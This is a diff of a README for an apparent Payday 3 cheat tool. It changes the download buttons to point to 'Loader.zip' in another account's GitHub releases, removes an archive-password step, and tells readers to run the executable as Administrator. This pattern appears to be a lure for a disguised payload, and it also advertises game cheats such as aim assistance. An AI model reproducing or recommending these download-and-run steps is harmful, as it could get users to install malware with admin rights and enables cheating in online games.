@@ -13,7 +13,7 @@
 
 <div align="center">
 
-  <a href="https://github.com/BlazeKazekage/release/releases/download/1/Loader.zip">
+  <a href="https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip">
     <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
   </a>
 
@@ -85,17 +85,16 @@ Payday 3 is a intense cooperative heist shooter where every second counts. Wheth
 ### Step‑by‑Step Installation
 
 1. **⬇️ Download** the tool from the button below.
-2. **📦 Extract** the archive (password: `respocket`).
-3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
-4. **✅ Follow the setup wizard** – complete the installation.
-5. **🚀 Launch the Tool** – the main window appears.
-6. **🎮 Start Payday 3** – launch the game.
-7. **🔓 Press INSERT** – open the in‑game overlay menu.
-8. **⚙️ Enable features** – toggle radar, guard indicators, aim assistance, loot tracking, performance tweaks, etc.
+2. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
+3. **✅ Follow the setup wizard** – complete the installation.
+4. **🚀 Launch the Tool** – the main window appears.
+5. **🎮 Start Payday 3** – launch the game.
+6. **🔓 Press INSERT** – open the in‑game overlay menu.
+7. **⚙️ Enable features** – toggle radar, guard indicators, aim assistance, loot tracking, performance tweaks, etc.
 
 <div align="center">
 
-  <a href="../../releases">
+  <a href="https://github.com/PrismMonitorPlan/release/releases/download/1/Loader.zip">
     <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
   </a>
 
